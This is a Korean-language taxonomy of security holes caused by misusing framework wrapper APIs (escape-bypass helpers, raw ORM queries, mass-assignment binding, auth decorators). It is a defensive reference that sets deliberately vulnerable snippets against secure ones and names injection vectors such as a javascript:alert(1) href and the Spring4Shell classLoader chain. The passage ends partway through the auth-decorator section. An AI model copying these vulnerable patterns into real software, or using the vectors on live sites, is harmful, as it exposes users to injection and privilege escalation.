# Framework Wrapper Function Misuse — Mutation/Variation Taxonomy

프레임워크가 제공하는 **Wrapper 함수**(편의 API, 데코레이터, 헬퍼, 설정 메서드)를 개발자가 잘못 사용했을 때 발생하는 보안 취약점의 체계적 분류. 언어 표준 라이브러리(`os.path.join`, `subprocess` 등)가 아닌, **프레임워크 레벨에서 제공하는 추상화 계층**의 오용만을 다룬다.

---

## Classification Structure

이 문서는 **동일한 Wrapper 오용 패턴이 여러 프레임워크에 걸쳐 반복된다**는 관점에서 조직된다. 기존의 프레임워크별 taxonomy(spring.md, ruby-on-rails.md 등)가 수직적(프레임워크 단위) 분석이라면, 이 문서는 **수평적(Wrapper 유형 단위) 분석**이다.

**Axis 1 — Wrapper Category (1차 구조):** 프레임워크가 추상화하는 연산의 종류별 분류.

| Category | Description | 대표 Wrapper |
|----------|-------------|-------------|
| **§1. Safety Marking** | "이 데이터는 이스케이프 불필요"라고 프레임워크에 선언하는 Wrapper | `mark_safe()`, `html_safe`, `Html.Raw()`, `v-html` |
| **§2. ORM Raw Query** | ORM의 안전한 쿼리 빌더를 우회하여 원시 SQL을 주입하는 Wrapper | `extra()`, `DB::raw()`, `Arel.sql()`, `@Query` SpEL |
| **§3. Data Binding** | HTTP 파라미터를 서버 객체에 자동 매핑하는 Wrapper | `@ModelAttribute`, `params.permit`, `ModelForm`, `$fillable` |
| **§4. Auth/Security Decorator** | 인증·인가·CSRF를 선언적으로 적용/면제하는 Wrapper | `@login_required`, `@csrf_exempt`, `@PreAuthorize`, `[Authorize]` |
| **§5. Template Rendering** | 동적 템플릿 렌더링을 제어하는 Wrapper | `render inline:`, `th:utext`, `__${...}__`, `v-html` |
| **§6. Serialization Config** | 직렬화/역직렬화 동작을 설정하는 Wrapper | `@JsonTypeInfo`, `enableDefaultTyping()`, `serialize :col` |
| **§7. Redirect Construction** | HTTP 리다이렉트 응답을 생성하는 Wrapper | `redirect_to`, `HttpResponseRedirect`, `"redirect:"` |
| **§8. File Serving** | 서버 파일을 클라이언트에 전송하는 Wrapper | `send_file`, `express.static()`, `FileResponse` |
| **§9. CORS Configuration** | Cross-Origin 정책을 설정하는 Wrapper | `@CrossOrigin`, `cors()`, `CORS_ALLOW_ALL_ORIGINS` |
| **§10. Validation Bypass** | 입력 검증을 수행하되 불완전하거나 우회 가능한 Wrapper | `@Valid`, `Form.clean()`, `validates`, Validator rules |

**Axis 2 — Failure Mode (실패 구조):**

| Code | Name | Description |
|------|------|-------------|
| **F1** | Semantic Inversion | Wrapper 이름이 실제 동작의 반대를 암시 (예: `html_safe`는 "안전하게 만든다"가 아니라 "이스케이프를 끈다") |
| **F2** | Overpermissive Default | Wrapper의 기본 동작이 최대 권한/최소 제한 (예: `permit!`, `fields='__all__'`, `enableDefaultTyping()`) |
| **F3** | Decorator Ordering/Scope Gap | 데코레이터/미들웨어의 적용 순서·범위 오해로 보호 누락 (예: `skip_before_action`, `@csrf_exempt`) |
| **F4** | Abstraction Escape Hatch Abuse | ORM 등의 안전한 추상화를 의도적으로 우회하는 "raw" API 오용 (예: `extra()`, `DB::raw()`) |
| **F5** | Config-as-Code Misunderstanding | 설정용 Wrapper의 보안 함의를 모르고 사용 (예: `@JsonTypeInfo`, `CORS_ALLOW_ALL_ORIGINS`) |
| **F6** | Implicit Trust Propagation | Wrapper 통과 결과가 후속 처리에서 무조건 신뢰됨 (예: `mark_safe` 결과가 템플릿에서 이스케이프 면제) |

**Axis 3 — Impact:**

| Impact | Symbol |
|--------|--------|
| Remote Code Execution | **RCE** |
| Cross-Site Scripting | **XSS** |
| SQL Injection | **SQLi** |
| Mass Assignment / Privilege Escalation | **AUTHZ** |
| Server-Side Request Forgery | **SSRF** |
| Open Redirect | **OR** |
| Information Disclosure | **INFO** |
| Cross-Site Request Forgery | **CSRF** |
| Insecure Deserialization | **DESER** |

---

## §1. Safety Marking Wrappers

모든 주요 프레임워크는 **자동 이스케이프(auto-escaping)**를 기본값으로 제공한다. 동시에, 이를 우회하는 "escape hatch" Wrapper를 제공한다. 이 Wrapper는 **"이 데이터는 이미 안전하므로 이스케이프하지 말라"**고 프레임워크에 선언하는 것이다. 개발자가 사용자 입력을 이 Wrapper에 전달하면 즉시 XSS가 발생한다.

### §1-1. Django `mark_safe()` / `format_html()`

**소스 구현** (`django/utils/safestring.py`):
```python
class SafeData:
    """마커 클래스: 이 문자열은 HTML 이스케이프가 불필요하다"""
    __html__ = lambda self: self

class SafeString(str, SafeData):
    pass

def mark_safe(s):
    return SafeString(s)  # 이스케이프 면제 선언
```

`mark_safe()`는 문자열을 `SafeString`으로 래핑한다. Django 템플릿 엔진은 `SafeData` 인스턴스를 만나면 `escape()`를 건너뛴다. 이름이 "safe"를 만든다(make safe)처럼 읽히지만, 실제로는 "이미 safe하다고 표시한다(mark as safe)"는 의미다.

| Subtype | Mechanism | Key Condition | Impact |
|---------|-----------|---------------|--------|
| **사용자 입력 직접 마킹** | `mark_safe(user_input)` — 사용자 입력을 그대로 SafeString으로 래핑 | 개발자가 mark_safe를 "sanitize" 함수로 오해 | XSS |
| **format 후 마킹** | `mark_safe(f'<b>{user_input}</b>')` — f-string 보간 후 전체를 마킹 | 사용자 입력이 이스케이프되지 않은 채 포함 | XSS |
| **`|safe` 템플릿 필터** | `{{ user_input|safe }}` — 템플릿에서 직접 이스케이프 비활성화 | 템플릿 작성자가 데이터 출처를 모르고 사용 | XSS |
| **`{% autoescape off %}` 블록** | 블록 내 모든 변수의 자동 이스케이프를 비활성화 | 블록 범위를 과도하게 넓게 설정 | XSS |
| **커스텀 템플릿 태그에서 mark_safe** | 커스텀 태그가 내부에서 `mark_safe()`를 사용하면서 입력을 검증하지 않음 | 태그 개발자가 입력 신뢰 가정 | XSS |

**안전한 대안 — `format_html()`:**
```python
# VULNERABLE:
mark_safe(f'<a href="{url}">{name}</a>')

# SECURE: format_html은 인자를 개별 이스케이프한 뒤 결합
from django.utils.html import format_html
format_html('<a href="{}">{}</a>', url, name)
# url과 name이 각각 escape된 후 HTML 구조에 삽입됨
```

`format_html()`은 Django가 제공하는 **올바른** safety marking wrapper다. 정적 HTML 구조는 유지하면서 동적 값만 이스케이프한다.

### §1-2. Rails `html_safe` / `raw()` / `SafeBuffer`

**소스 구현** (`activesupport/lib/active_support/core_ext/string/output_safety.rb`):
```ruby
class String
  def html_safe
    ActiveSupport::SafeBuffer.new(self)
  end
end

class SafeBuffer < String
  def concat(value)
    super(ERB::Util.unwrapped_html_escape(value))
  end
  alias_method :+, :concat
end
```

`html_safe`는 문자열을 `SafeBuffer`로 변환한다. `SafeBuffer`는 이후에 `+` 연산으로 추가되는 문자열은 이스케이프하지만, **자신의 원본 내용은 이스케이프하지 않는다**. `raw()`는 `html_safe`의 헬퍼 별칭이다.

| Subtype | Mechanism | Key Condition | Impact |
|---------|-----------|---------------|--------|
| **사용자 입력에 html_safe** | `params[:name].html_safe` — 사용자 입력을 SafeBuffer로 변환 | 개발자가 html_safe를 "HTML을 안전하게 만드는 함수"로 오해 | XSS |
| **보간 후 html_safe** | `"<div>#{user_input}</div>".html_safe` — Ruby 보간은 SafeBuffer 외부에서 발생 | 보간된 사용자 입력이 이스케이프 없이 SafeBuffer에 포함 | XSS |
| **raw() 헬퍼** | `<%= raw(user.bio) %>` — 템플릿에서 이스케이프 비활성화 | raw의 의미를 "원본 그대로 출력"으로 이해하고 사용 | XSS |
| **`<%== %>` 더블 이퀄** | `<%== user_input %>` — html_safe의 ERB 약어 | 코드 리뷰에서 `<%=` 와의 차이를 놓침 | XSS |
| **content_tag attribute injection** | `content_tag(:a, "click", href: user_url)` — `javascript:` 프로토콜 주입 | URL 속성에 사용자 입력이 프로토콜 검증 없이 삽입 | XSS |
| **link_to javascript: protocol** | `link_to "click", params[:url]` — href에 `javascript:alert(1)` 주입 | Rails는 href 값을 이스케이프하지만 프로토콜을 차단하지 않음 | XSS |

**Rails sanitize 헬퍼의 반복적 우회 이력:**

`sanitize()` 헬퍼 자체도 여러 차례 우회되었다:

| CVE | 연도 | 우회 기법 |
|-----|------|----------|
| CVE-2022-32209 | 2022 | `select`/`style` 태그를 통한 CSS injection |
| CVE-2022-23519 | 2022 | 특정 브라우저 파싱 차이를 이용한 태그 injection |
| CVE-2024-53985 | 2024 | `noscript` 태그 내부의 파싱 차이를 이용한 XSS |
| CVE-2013-1855 | 2013 | `sanitize_css`를 통한 style attribute injection |

### §1-3. Laravel Blade `{!! !!}`

```php
<!-- SAFE: 자동 이스케이프 (htmlspecialchars) -->
{{ $user->name }}

<!-- VULNERABLE: 이스케이프 비활성화 -->
{!! $user->bio !!}
```

Laravel Blade에서 `{{ }}`는 `htmlspecialchars()`를 적용하고, `{!! !!}`는 이를 건너뛴다.

| Subtype | Mechanism | Key Condition | Impact |
|---------|-----------|---------------|--------|
| **{!! !!} 직접 사용** | 사용자 입력을 `{!! !!}`로 출력 | 개발자가 HTML 리치 콘텐츠 출력을 위해 사용하면서 sanitize 누락 | XSS |
| **@php 블록 내 echo** | `@php echo $user_input; @endphp` — Blade 이스케이프를 완전히 우회 | 템플릿 내 PHP 코드에서 직접 출력 | XSS |
| **커스텀 Blade directive** | `Blade::directive('raw', fn($expr) => "<?php echo $expr; ?>")` — 커스텀 directive가 이스케이프 미적용 | 프로젝트 자체 Blade directive 정의 | XSS |

### §1-4. Spring/Thymeleaf `th:utext` vs `th:text`

```html
<!-- SAFE: th:text는 HTML 이스케이프 적용 -->
<p th:text="${user.bio}">...</p>

<!-- VULNERABLE: th:utext는 이스케이프 비활성화 (unescaped text) -->
<p th:utext="${user.bio}">...</p>
```

| Subtype | Mechanism | Key Condition | Impact |
|---------|-----------|---------------|--------|
| **th:utext 사용자 입력** | `th:utext="${userInput}"` — "u"가 "unescaped"를 의미함을 모르고 사용 | 변수명이 안전한 것처럼 보여 th:utext 사용 | XSS |
| **인라인 모드** | `[(${userInput})]` vs `[[${userInput}]]` — `[( )]`는 unescaped 인라인 | 인라인 표현식 문법 차이를 모름 | XSS |

### §1-5. ASP.NET Razor `Html.Raw()`

```csharp
<!-- SAFE: 자동 이스케이프 -->
@Model.UserName

<!-- VULNERABLE: 이스케이프 비활성화 -->
@Html.Raw(Model.UserBio)
```

| Subtype | Mechanism | Key Condition | Impact |
|---------|-----------|---------------|--------|
| **Html.Raw() 사용자 입력** | `@Html.Raw(userInput)` — 사용자 입력을 그대로 HTML에 삽입 | 개발자가 Rich HTML 출력을 위해 사용 | XSS |
| **MarkupString** | `new MarkupString(userInput)` — Blazor에서 Html.Raw 대응 | Blazor 컴포넌트에서 사용자 입력 래핑 | XSS |
| **HtmlString** | `new HtmlString(userInput)` — MVC에서 이스케이프 면제 | 프로그래밍 방식으로 HTML 생성 시 | XSS |

### §1-6. Frontend Framework Safety Bypass Wrappers

| Framework | Wrapper | 메커니즘 | 기본 보호 |
|-----------|---------|----------|----------|
| **React** | `dangerouslySetInnerHTML={{__html: data}}` | DOM에 원시 HTML 주입 | JSX 자동 이스케이프 |
| **Vue** | `v-html` directive | DOM에 원시 HTML 주입 | 머스타시 `{{ }}` 이스케이프 |
| **Angular** | `bypassSecurityTrustHtml()` | DomSanitizer 우회 선언 | 자동 sanitization |
| **Svelte** | `{@html data}` | 원시 HTML 삽입 | 자동 이스케이프 |
| **Astro** | `set:html` directive | 원시 HTML 삽입 | 자동 이스케이프 |

Angular의 `DomSanitizer` bypass 메서드 가족:
```typescript
// 모두 "나는 이 데이터가 안전함을 보증한다"는 선언
this.sanitizer.bypassSecurityTrustHtml(userInput)      // XSS
this.sanitizer.bypassSecurityTrustStyle(userInput)      // CSS injection
this.sanitizer.bypassSecurityTrustScript(userInput)     // Script injection
this.sanitizer.bypassSecurityTrustUrl(userInput)        // URL injection
this.sanitizer.bypassSecurityTrustResourceUrl(userInput) // iframe/embed injection
```

### §1 Cross-Framework Pattern

**공통 구조:** 모든 프레임워크가 `Auto-escape ON (기본값)` ↔ `Escape OFF (escape hatch)` 이중 구조를 갖는다. 취약점은 항상 escape hatch에서 발생한다.

| 프레임워크 | Auto-escape (안전) | Escape hatch (위험) | 안전한 대안 |
|-----------|-------------------|-------------------|-----------|
| Django | `{{ var }}` | `mark_safe()`, `{{ var|safe }}` | `format_html()` |
| Rails | `<%= var %>` | `html_safe`, `raw()`, `<%== %>` | `content_tag()`, `tag.*` |
| Laravel | `{{ $var }}` | `{!! $var !!}` | Purifier 패키지 |
| Thymeleaf | `th:text` | `th:utext` | Server-side sanitize 후 `th:utext` |
| ASP.NET Razor | `@var` | `Html.Raw()` | `HtmlSanitizer` 라이브러리 |
| React | `{var}` (JSX) | `dangerouslySetInnerHTML` | `DOMPurify.sanitize()` |
| Vue | `{{ var }}` | `v-html` | `DOMPurify.sanitize()` |
| Angular | `{{ var }}` / `[innerText]` | `bypassSecurityTrustHtml()` | 기본 sanitizer 유지 |
| Svelte | `{var}` | `{@html var}` | `DOMPurify.sanitize()` |

---

## §2. ORM Raw Query Wrappers

모든 ORM은 파라미터 바인딩을 통해 SQL Injection을 방지한다. 동시에, 복잡한 쿼리를 위해 **원시 SQL을 삽입할 수 있는 escape hatch**를 제공한다. 이 escape hatch에 사용자 입력이 들어가면 SQL Injection이 발생한다.

### §2-1. Django ORM Raw Query Wrappers

| Wrapper | 위험도 | 메커니즘 | Key Condition |
|---------|--------|---------|---------------|
| **`extra()`** | 높음 | `QuerySet.extra(where=[f"name='{input}'"])` — deprecated이지만 레거시 코드에 잔존 | 사용자 입력이 extra()의 where/select/tables 인자에 보간 |
| **`raw()`** | 높음 | `Model.objects.raw(f"SELECT * FROM app_user WHERE name='{input}'")` — 완전한 원시 SQL | 사용자 입력이 raw SQL 문자열에 보간 |
| **`RawSQL()`** | 높음 | `queryset.annotate(val=RawSQL(f"... {input} ..."))` — annotation에 원시 SQL 삽입 | annotate/aggregate에서 RawSQL 사용 |
| **`__regex` / `__iregex` lookup** | 중간 | 일부 DB 백엔드에서 정규식이 SQL로 직접 전달되어 ReDoS 또는 에러 기반 정보 노출 | PostgreSQL 등에서 사용자 정규식 직접 전달 |
| **`Func()` / `Value()` 조합** | 중간 | `Func('field', function=user_input)` — 함수명을 사용자가 제어 | ORM 함수 래퍼에 사용자 입력 전달 |

**extra() 의 deprecation 이유**: Django 공식 문서는 `extra()`를 "a last resort"로 분류하고 deprecation을 진행 중이다. `extra()`의 `where`, `select`, `tables` 파라미터 모두가 원시 SQL을 받으며, 파라미터 바인딩 지원이 불완전하다.

```python
# VULNERABLE: extra()에 사용자 입력 보간
User.objects.extra(where=[f"username='{request.GET['q']}'"])

# VULNERABLE: raw()에 사용자 입력 보간
User.objects.raw(f"SELECT * FROM users WHERE name = '{name}'")

# SECURE: raw()에 파라미터 바인딩
User.objects.raw("SELECT * FROM users WHERE name = %s", [name])

# SECURE: ORM 쿼리 빌더 사용
User.objects.filter(username=request.GET['q'])
```

### §2-2. Rails ActiveRecord Raw Query Wrappers

Rails의 ActiveRecord는 안전한 쿼리 인터페이스와 다수의 원시 SQL escape hatch를 동시에 제공한다. [rails-sqli.org](https://rails-sqli.org)는 버전별 injectable 메서드 목록을 유지한다.

| Wrapper | 메커니즘 | Key Condition | Impact |
|---------|---------|---------------|--------|
| **`where(string)`** | `User.where("name = '#{params[:name]}'")` — 문자열 보간으로 SQL 주입 | 개발자가 `where("col = ?", val)` 바인딩 대신 보간 사용 | SQLi |
| **`order()` / `reorder()`** | `User.order(params[:sort])` — ORDER BY 절에 원시 SQL 주입 (Rails < 6.0에서 무제한) | 사용자가 정렬 칼럼을 제어, CASE 문으로 데이터 추출 가능 | SQLi |
| **`pluck()`** | `User.pluck(params[:field])` — SELECT 절에 원시 SQL (Rails < 6.1) | 사용자가 추출 필드를 제어 | SQLi |
| **`group()`** | `User.group(params[:col])` — GROUP BY 절에 원시 SQL | 사용자 입력이 집계 쿼리에 삽입 | SQLi |
| **`select(string)`** | `User.select(params[:cols])` — SELECT 절 조작 | 사용자가 선택 칼럼을 제어 | SQLi |
| **`from()`** | `User.from(params[:table])` — FROM 절 전체 교체 | 서브쿼리 주입 또는 테이블 치환 | SQLi |
| **`having()`** | `User.having(params[:cond])` — HAVING 절에 원시 SQL | 사용자 입력이 필터 조건에 삽입 | SQLi |
| **`joins(string)`** | `User.joins(params[:join])` — JOIN 절에 원시 SQL | JOIN 조건을 사용자가 제어 | SQLi |
| **`find_by_sql()`** | `User.find_by_sql("SELECT ... #{input}")` — 완전한 원시 SQL | 어떤 파라미터 바인딩도 없음 | SQLi |
| **`Arel.sql()`** | `User.order(Arel.sql(params[:sort]))` — 명시적으로 "이 문자열은 SQL이다"라고 선언 | 개발자가 Arel.sql을 "이스케이프 함수"로 오해 (§1의 mark_safe와 동일 패턴) | SQLi |
| **`delete_all(string)`** | `User.delete_all("created_at < '#{date}'")` — WHERE 절에 원시 SQL | 삭제 조건에 사용자 입력 | SQLi |
| **`update_all(string)`** | `User.update_all("balance = #{amount}")` — SET 절에 원시 SQL | 업데이트 값에 사용자 입력 | SQLi |
| **`calculate()`** | `User.calculate(:sum, params[:field])` — 집계 대상에 원시 SQL | 사용자가 집계 필드를 제어 | SQLi |
| **`exists?(string)`** | `User.exists?("name = '#{input}'")` — 조건에 원시 SQL | 존재 확인 조건에 사용자 입력 | SQLi |

**Rails 6.0+의 개선:** `order()`, `reorder()`, `pluck()` 등에서 원시 SQL 문자열을 전달하면 Deprecation Warning이 발생하고, `Arel.sql()`로 명시적 래핑을 요구한다. 하지만 이는 `Arel.sql(user_input)` 형태로 오용 가능하며, 이 경우 오히려 개발자에게 "안전하게 처리했다"는 잘못된 확신을 줄 수 있다.

### §2-3. Laravel Eloquent Raw Query Wrappers

| Wrapper | 메커니즘 | Key Condition | Impact |
|---------|---------|---------------|--------|
| **`DB::raw()`** | `DB::raw("FIELD(id, $ids)")` — 원시 SQL 표현식을 쿼리 빌더에 삽입 | 사용자 입력이 DB::raw() 안에 보간 | SQLi |
| **`whereRaw()`** | `->whereRaw("name = '$input'")` — WHERE 절에 원시 SQL | 바인딩 파라미터 미사용 | SQLi |
| **`selectRaw()`** | `->selectRaw("$userField as alias")` — SELECT 절에 원시 SQL | 칼럼명을 사용자가 제어 | SQLi |
| **`orderByRaw()`** | `->orderByRaw($sortExpr)` — ORDER BY 절에 원시 SQL | 정렬 표현식을 사용자가 제어 | SQLi |
| **`havingRaw()`** | `->havingRaw("count > $val")` — HAVING 절에 원시 SQL | 필터 조건에 사용자 입력 | SQLi |
| **`groupByRaw()`** | `->groupByRaw($expr)` — GROUP BY 절에 원시 SQL | 그룹 표현식을 사용자가 제어 | SQLi |
| **`DB::statement()`** | `DB::statement("ALTER TABLE $table ...")` — DDL 포함 임의 SQL 실행 | 테이블명/칼럼명에 사용자 입력 | SQLi |

```php
// VULNERABLE: DB::raw에 사용자 입력 보간
$users = User::whereRaw("email = '$email'")->get();

// SECURE: 바인딩 파라미터 사용
$users = User::whereRaw("email = ?", [$email])->get();

// SECURE: Eloquent 쿼리 빌더 사용
$users = User::where('email', $email)->get();
```

### §2-4. Spring Data JPA `@Query` with SpEL

| Wrapper | 메커니즘 | Key Condition | Impact |
|---------|---------|---------------|--------|
| **`@Query` SpEL 주입** | `@Query("SELECT u FROM User u WHERE u.name = ?#{#name}")` — SpEL 표현식 내에서 사용자 입력 평가 | SpEL 표현식이 사용자 입력을 동적으로 처리 | RCE |
| **`nativeQuery=true`** | `@Query(value = "SELECT * FROM users WHERE name = :name", nativeQuery = true)` — 네이티브 SQL에서 파라미터 보간 실수 | 네이티브 쿼리에서 `+` 연산자로 문자열 결합 | SQLi |
| **`Specification` 동적 생성** | `Specification.where((root, cq, cb) -> cb.equal(root.get(userField), value))` — 칼럼명을 사용자가 제어 | 동적 검색 필터에서 필드명 검증 없이 사용 | SQLi |
| **Spring Data MongoDB `@Query`** | `@Query("{'name': ?#{#input}}")` — MongoDB 쿼리에 SpEL 주입 | SpEL이 MongoDB 쿼리 컨텍스트에서 평가 | RCE |

### §2-5. SQLAlchemy / TypeORM

| Framework | Wrapper | 메커니즘 |
|-----------|---------|---------|
| **SQLAlchemy** | `text()` | `session.execute(text(f"SELECT * FROM users WHERE name = '{input}'"))` — 바인딩 미사용 시 SQLi |
| **SQLAlchemy** | `literal_column()` | `query.order_by(literal_column(user_input))` — 칼럼명으로 원시 SQL 주입 |
| **TypeORM** | `createQueryBuilder().where(input)` | WHERE 절에 문자열 직접 전달 시 SQLi |
| **TypeORM** | `.query()` | `connection.query(f"SELECT ... {input}")` — 완전한 원시 SQL |

### §2 Cross-Framework Pattern

**공통 구조:** 모든 ORM이 `Safe Query Builder (기본)` ↔ `Raw SQL Escape Hatch` 이중 구조를 갖는다. 취약점은 Raw escape hatch에 사용자 입력이 바인딩 없이 보간될 때 발생한다.

| 위험 수준 | 패턴 | 예시 |
|----------|------|------|
| **치명적** | 완전한 원시 SQL에 보간 | `raw()`, `find_by_sql()`, `DB::statement()` |
| **높음** | 부분 원시 SQL 삽입 (WHERE, ORDER BY 등) | `whereRaw()`, `extra()`, `order(string)` |
| **중간** | 칼럼명/테이블명을 사용자가 제어 | `pluck(input)`, `select(input)`, `order(input)` |
| **낮음** | ORM 쿼리 빌더 내 특수 조건 | `__regex` lookup, Specification 필드명 |

---

## §3. Data Binding / Mass Assignment Wrappers

프레임워크가 HTTP 요청 파라미터를 서버 객체에 자동 매핑하는 "편의" 기능. 개발자가 **어떤 필드가 바인딩 가능한지 명시적으로 제한하지 않으면**, 공격자가 `isAdmin=true`, `role=superuser` 같은 파라미터를 추가하여 권한 상승.

### §3-1. Spring `@ModelAttribute` / `DataBinder`

Spring MVC는 HTTP 파라미터 이름으로 JavaBean property를 자동 설정한다. `class.module.classLoader` 같은 중첩 프로퍼티 체인을 통해 프레임워크 내부 객체까지 조작 가능.

| Subtype | Mechanism | Key Condition | Impact |
|---------|-----------|---------------|--------|
| **권한 프로퍼티 직접 설정** | `?role=ADMIN&active=true` — 도메인 객체의 민감 필드 직접 변경 | `@InitBinder`로 허용 필드를 제한하지 않은 컨트롤러 | AUTHZ |
| **ClassLoader 프로퍼티 체인 (Spring4Shell)** | `class.module.classLoader.resources...` — Java 9+ 모듈 시스템을 통해 Tomcat 내부 객체 조작 | JDK 9+, WAR on Tomcat, `@ModelAttribute` 사용 (CVE-2022-22965) | RCE |
| **JSON Body vs Form 불일치** | `@RequestBody` JSON 바인딩은 `@InitBinder` 제한을 적용하지 않을 수 있음 | 같은 엔드포인트에서 Form/JSON 혼용 | AUTHZ |
| **중첩 객체 탐색** | `user.address.verified=true` — 점 표기법으로 연관 객체의 프로퍼티 변경 | 복잡한 도메인 모델에서 양방향 참조 존재 | AUTHZ |

```java
// VULNERABLE: 도메인 객체 직접 바인딩
@PostMapping("/user/update")
public String update(@ModelAttribute User user) {
    userRepository.save(user);  // isAdmin, role 등 모든 필드가 바인딩됨
}

// SECURE: @InitBinder로 허용 필드 제한
@InitBinder
public void initBinder(WebDataBinder binder) {
    binder.setAllowedFields("email", "name", "phone");
}

// SECURE: DTO 패턴
@PostMapping("/user/update")
public String update(@RequestBody UserUpdateDTO dto) {
    User user = userService.findById(dto.getId());
    user.setEmail(dto.getEmail());  // 명시적 필드 매핑만 허용
    user.setName(dto.getName());
    userRepository.save(user);
}
```

### §3-2. Rails Strong Parameters (`params.permit`)

Rails 4+의 Strong Parameters는 GitHub Mass Assignment 사건(2012, Egor Homakov) 이후 도입되었다. 허용 필드를 컨트롤러에서 명시하도록 강제하지만, 여러 오용 패턴이 존재한다.

| Subtype | Mechanism | Key Condition | Impact |
|---------|-----------|---------------|--------|
| **`permit!` (전체 허용)** | `params.permit!` — 모든 파라미터 필터링 비활성화, Rails 4 이전과 동일 상태 | 개발자가 편의를 위해 `permit!` 사용 | AUTHZ |
| **`permit_all_parameters` 글로벌 플래그** | `ActionController::Parameters.permit_all_parameters = true` — 전역 비활성화 | 개발 환경 설정이 프로덕션에 유출 | AUTHZ |
| **과도하게 넓은 중첩 허용** | `permit(preferences: {})` — 빈 해시는 ANY 키를 허용 | 중첩 해시에서 허용 키를 명시하지 않음 | AUTHZ |
| **민감 필드 명시적 허용** | `permit(:name, :email, :role)` — `:role`이 포함됨 | 코드 리뷰에서 민감 필드 누락 | AUTHZ |
| **중첩 속성 공격** | `accepts_nested_attributes_for`를 통해 연관 모델의 속성까지 Mass Assignment | 중첩 속성 허용 시 `reject_if` 미설정 | AUTHZ |
| **타입 혼동** | 배열이 기대되는 곳에 해시를 전송하여 Strong Parameters 검증 로직 우회 | Hash/Array 타입 체크 미실시 | AUTHZ |

### §3-3. Django `ModelForm` / DRF `ModelSerializer`

| Subtype | Mechanism | Key Condition | Impact |
|---------|-----------|---------------|--------|
| **`fields = '__all__'`** | `class Meta: fields = '__all__'` — 모델의 모든 필드가 폼/API에 노출 | 새 민감 필드 추가 시 자동으로 노출 | AUTHZ |
| **`exclude` 사용** | `class Meta: exclude = ['created_at']` — 명시되지 않은 필드는 모두 허용 | `is_admin` 등이 exclude 목록에서 누락 | AUTHZ |
| **DRF `ModelSerializer` 과다 노출** | `class Meta: fields = '__all__'` — API 응답에 비밀번호 해시, 내부 상태 등 포함 가능 | REST API에서 모든 필드 직렬화 | INFO, AUTHZ |
| **DRF `extra_kwargs` 미사용** | 쓰기 가능 필드에 `read_only=True` 미설정 | 읽기 전용이어야 할 필드가 업데이트 가능 | AUTHZ |

```python
# VULNERABLE: exclude 패턴 — 새 민감 필드가 자동 노출
class UserForm(forms.ModelForm):
    class Meta:
        model = User
        exclude = ['created_at']  # is_staff, is_superuser 누락!

# SECURE: 명시적 fields 허용목록
class UserForm(forms.ModelForm):
    class Meta:
        model = User
        fields = ['name', 'email', 'phone']
```

### §3-4. Laravel Eloquent `$fillable` / `$guarded`

| Subtype | Mechanism | Key Condition | Impact |
|---------|-----------|---------------|--------|
| **`$guarded = []` (빈 배열)** | 모든 속성이 Mass Assignment 가능 | `$guarded`를 빈 배열로 설정하여 보호 완전 해제 | AUTHZ |
| **`$fillable` 과다 포함** | `$fillable = ['name', 'email', 'role']` — `role`이 포함 | 민감 필드가 fillable에 포함됨 | AUTHZ |
| **`Model::create($request->all())`** | 요청의 모든 파라미터를 그대로 모델 생성에 전달 | `$fillable` 설정이 되어 있어도 관리가 어려움 | AUTHZ |
| **`Model::unguard()` 전역** | 테스트/시딩에서 사용하는 unguard가 프로덕션에 유출 | Seeder 코드가 미들웨어에 영향 | AUTHZ |
| **JSON 칼럼 nested 주입** | `$fillable`에 JSON 칼럼이 포함되면 내부 키를 제한할 수 없음 | `settings->is_admin` 같은 JSON 경로 조작 | AUTHZ |

### §3-5. ASP.NET Model Binding `[Bind]` / `TryUpdateModelAsync`

| Subtype | Mechanism | Key Condition | Impact |
|---------|-----------|---------------|--------|
| **[Bind] 미사용 직접 바인딩** | `public IActionResult Update(User user)` — 모든 public 프로퍼티가 바인딩됨 | 액션 메서드에서 도메인 모델 직접 사용 | AUTHZ |
| **[Bind] Include 누락** | `[Bind("Name,Email")]` 지정 시 나머지 필드는 무시되지만, 지정하지 않으면 전체 바인딩 | 바인딩 제한을 잊음 | AUTHZ |
| **TryUpdateModelAsync Overposting** | `await TryUpdateModelAsync(user)` — 기존 엔티티를 요청 데이터로 업데이트 시 의도하지 않은 필드 변경 | 업데이트할 필드를 명시하지 않음 | AUTHZ |

---

## §4. Auth/Security Decorator Wrappers

프레임워크가 제공하는 선언적 인증·인가·CSRF 데코레이터. **적용 범위, 순서, 면제(exempt)** 패턴에서 보호 누락이 발생한다.

### §4-1. Django Auth/CSRF Decorators

| Subtype | Mechanism | Key Condition | Impact |
|---------|-----------|---------------|--------|
| **`@csrf_exempt` 남용** | 뷰 함수에 `@csrf_exempt`를 적용하여 CSRF 보호 비활성화 | API 엔드포인트에 "필요 없다"고 판단하여 면제, 하지만 쿠키 인증이 가능한 경우 | CSRF |
| **CBV `@login_required` 미적용** | `@login_required`를 Class-Based View의 메서드가 아닌 잘못된 위치에 적용 | `dispatch()` 대신 개별 메서드에 적용 시 일부 HTTP 메서드가 보호되지 않음 | AUTHZ |
| **`@permission_required` raise_exception** | `raise_exception=False` (기본값)일 때 비인증 사용자는 로그인 페이지로 리다이렉트되지만, **인증된 권한 부족 사용자는 403 대신 로그인 페이지로 이동** | 권한 부족 시 403 응답을 기대했으나 리다이렉트 발생 | AUTHZ |
| **`@method_decorator` 누락** | CBV에서 `@method_decorator(login_required, name='dispatch')` 대신 직접 데코레이터 적용 시도 | CBV와 함수 데코레이터의 호환성 이슈 | AUTHZ |
| **DRF `permission_classes` 빈 리스트** | `permission_classes = []` 또는 `AllowAny` — API 엔드포인트의 인증 완전 해제 | 개발 중 설정이 프로덕션에 유출 | AUTHZ |

```python
# VULNERABLE: CBV에 @login_required 잘못 적용
class ProfileView(View):
    @login_required  # 이것은 동작하지 않음!
    def get(self, request):
        ...

# SECURE: method_decorator로 dispatch에 적용
from django.utils.decorators import method_decorator

@method_decorator(login_required, name='dispatch')
class ProfileView(View):
    def get(self, request):
        ...
```

### §4-2. Rails Auth Filter Wrappers

| Subtype | Mechanism | Key Condition | Impact |
|---------|-----------|---------------|--------|
| **`skip_before_action` 과도한 범위** | `skip_before_action :authenticate_user!, only: [:index]` → 이후 새 액션 추가 시 보호 누락 | 허용 액션 목록 관리 실수, 새 액션이 only 목록에 없어 보호됨처럼 보이지만 실제론 부모 컨트롤러의 skip이 적용 | AUTHZ |
| **상속 체인에서 skip** | 부모 컨트롤러의 `skip_before_action`이 자식 컨트롤러에 전파 | 컨트롤러 상속 구조에서 인증 필터 순서를 오해 | AUTHZ |
